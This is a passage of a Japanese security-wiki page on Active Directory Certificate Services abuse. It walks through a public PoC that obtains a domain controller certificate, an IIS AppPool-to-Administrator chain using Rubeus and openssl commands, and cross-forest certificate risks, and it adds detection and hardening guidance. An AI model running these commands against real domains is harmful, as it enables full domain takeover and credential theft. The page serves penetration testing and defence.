- 脆弱な、または未パッチのCAリクエストパス（**2026年7月14日**のMicrosoft更新では、**`cdc` のDC検証**と**解決されたSIDの比較**が追加されました）

取得した **`.pfx`** は **PKINIT** に使用でき、**`.ccache`** を生成できます。また、公開PoCの手順では、対象DCの **NT hash** も取得できます。通常、これで**ドメインを完全に侵害**できます。

### 悪用

公開PoCは、次の一連の処理を自動化します。<sup>[[1]](#references)</sup>

1. 攻撃者が制御する**マシンアカウント**を作成または再利用する。
2. `389` と `445` で**不正なLDAPおよびSMB/LSAリスナー**を起動する。
3. 攻撃者が制御する **`cdc`** と対象の **`rmd`** 属性を含む証明書リクエストを送信する。
4. CAから不正なリスナーへ、制御下のマシンアカウントとして認証させる一方、IDの照会には**対象DC**の属性を返す。
5. CA署名済みの**DC証明書**を受け取り、**PKINIT**に使用する。

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

PoCで役立つ実行時フラグ:

- `--listener <ip>`: `cdc` で通知する callback IP を明示的に選択する
- `--computer-name <NAME$>`: 新しいマシンアカウントを作成せず、既存のマシンアカウントを再利用する

**運用上の注意:**

- PoCは、**特権ポート** `389` と `445` にバインドするため、**root** が必要です。
- Exploitationに成功すると、ローカルに **DC `.pfx`** と **Kerberos `.ccache`** が書き込まれます。
- 証明書は **Domain Controllerアカウント** にマッピングされるため、その後の操作には **証明書ベースのKerberos認証**、**DCSync**、復元した **マシンのNT hash** の再利用などが含まれます。<sup>[[2]](#references)</sup>

## IIS AppPoolのマシン登録による同一ホストのAdministrator権限取得

`ApplicationPoolIdentity` で実行されるIISプールは、ネットワークリソースへのアクセス時に、ホストの **コンピューターアカウント** を使用します。そのため、`IIS AppPool\<POOL>` としてのコード実行は、ローカルのtokenでは低権限のままですが、CAが `HOST$` として認証するAD CS要求を送信できます。これは外向きのidentity transitionであり、token impersonationやPotato系のローカル権限昇格ではありません。<sup>[[19]](#references)[[20]](#references)</sup>

このchainには、ドメイン参加済みのIISホスト、RPC経由で到達可能なEnterprise CA、コンピューターに登録権限のある公開済みマシン認証template、PKINITのサポート、KDC/SMBへの到達性が必要です。カスタムプールidentityでは外向きのprincipalが変わるため、`HOST$` を前提とする前に、プールが実際に `ApplicationPoolIdentity` を使用していることを確認してください。<sup>[[19]](#references)[[20]](#references)</sup>

### 攻撃者が制御するkeyによる登録

IISサーバー以外でkey pairとCSRを生成し、秘密鍵を保持します。侵害したworkerから送信するのは **CSRのみ** です。[Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) は `CertificateAuthority.Request` をインスタンス化し、`CertificateTemplate:Machine` を設定して `ICertRequest::Submit` を呼び出し、発行された証明書を返します。CAの構成文字列には `CAHOST\CA-NAME` を使用します。通常の `Machine` templateはADからsubjectを構築するため、requesterがsubject/SANデータを指定する必要はありません。<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

返された証明書を **対応する保持済みの秘密鍵** と組み合わせます。`certutil -MergePFX machine_cert.cer machine_cert.pfx` が機能するのは、Windowsが証明書をアクセス可能な秘密鍵にすでに関連付けられる場合のみです。PEMファイルが別々の場合は、PKCS#12を明示的に作成します。<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

PKINIT に PFX を使用し、返されたコンピューター TGT はすぐにインジェクトせず、base64 のまま保持します:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus same-host service substitution

S4U2Selfを使うと、サービスは別のユーザーの認可データを含む、自分自身宛てのチケットを取得できます。コンピューターのTGTがあれば、Rubeusは特権ユーザー用のチケットを要求し、返されたKRB-CRED内のサービス名をCIFSに書き換えて注入できます。これはローカルの「自分自身への委任」プリミティブであり、S4U2Proxyや`msDS-AllowedToDelegateTo`エントリは必要ありません。<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

置換したticketは、**同じコンピューターアカウント／キー**を使用するサービス（ここでは`HOST`上のCIFS）でのみ使用できます。他のドメインコンピューターで使い回せるAdministrator ticketではありません。また、ここで示した結果は、Administratorとしての特権付きSMB／ファイルシステムアクセスです。ローカルの`NT AUTHORITY\SYSTEM`プロセスを取得するには、別途リモート実行の手順が必要です。<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### 検知とハードニング

- CA上で、Certification Servicesイベント**4886**（要求の受信）と**4887**（発行）を相関分析し、IISサーバーアカウントによる予期しない`Machine`テンプレートの要求を検出します。<sup>[[19]](#references)[[24]](#references)</sup>
- DC上では、証明書による事前認証が使用されると、イベント**4768**に証明書フィールドが含まれます。Webサーバーアカウントによる通常と異なるPKINIT TGT要求にアラートを設定します。続けて、特権ユーザーになりすましたIDと同じホストが関与する**4769**要求を調査します。Rubeusの`/altservice`はクライアント側でKRB-CREDのサービス名を書き換えるため、DC側の4769サービス名が`cifs`であることを必須条件にしないでください。<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe`によるCA RPCエンドポイントへのアクセス、予期しないASPXファイルの作成、Kerberos認証を使用した管理共有へのアクセス、secretのダンプ活動を調査します。可能な場合は、アプリケーション層からCA RPC／KDC／SMBへのアクセスを制限し、運用上必要のないコンピューター登録権限やマシン認証テンプレートを削除します。<sup>[[19]](#references)</sup>

## 証明書を用いたForestの侵害（受動態で解説）

### 侵害されたCAによるForest Trustの破壊

**cross-forest enrollment**の設定は、比較的簡単に行えます。resource forestの**root CA certificate**は管理者によって**account forestに公開**され、resource forestの**enterprise CA**証明書は、各account forestの`NTAuthCertificates`コンテナーとAIAコンテナーに**追加されます**。つまり、この構成では、resource forestの**CAに、PKIを管理する他のすべてのforestに対する完全な制御権が付与されます**。このCAが攻撃者によって**侵害されると**、resource forestとaccount forestのすべてのユーザーの証明書が攻撃者によって**偽造される可能性があり**、その結果、forestのセキュリティ境界が破られます。<sup>[[6]](#references)</sup>

### 外部Principalに付与された登録権限

複数のforestで構成される環境では、**Authenticated Usersまたは外部principal**（Enterprise CAが属するforestの外部にいるユーザー／グループ）に**登録権限と編集権限を許可する証明書テンプレートを公開している**Enterprise CAに注意が必要です。\
Trustを介して認証されると、ADによって**Authenticated Users SID**がユーザーのtokenに追加されます。そのため、あるドメインに**Authenticated Usersの登録権限を許可する**テンプレートを持つEnterprise CAがある場合、別のforestのユーザーがそのテンプレートに**登録できる可能性があります**。同様に、テンプレートによって**外部principalに登録権限が明示的に付与されている**場合、**forest間のアクセス制御関係が作られ**、あるforestのprincipalが別のforestのテンプレートに**登録できるようになります**。

どちらの場合も、forest間で**攻撃対象領域が拡大します**。攻撃者は証明書テンプレートの設定を悪用して、外部ドメインで追加の権限を取得する可能性があります。<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoCリポジトリ](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighostの技術分析](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Servicesの悪用](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9、ESC10、BloodHound GUI、新しい認証および要求メソッドなど](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Key Trust Account Mappingを悪用したアカウント乗っ取り](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key（誤）使用の物語](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC経由でのAD Certificate ServicesへのRelay](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSMを使用したADCS CAへのShellアクセス](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13の悪用手法](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14の悪用手法](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – 権限昇格（ESC1-ESC17）](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: ありふれたAD CS ESCではない](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: 設定ミスと悪用](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – 「Delegate 2 Thyself」の再検討](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollmentのPoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC Endpoint経由でのIIS AppPoolからの権限昇格](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12コマンド](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Servicesの監査](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – イベント4768: Kerberos認証ticketが要求された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – イベント4769: Kerberosサービスticketが要求された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell悪用toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
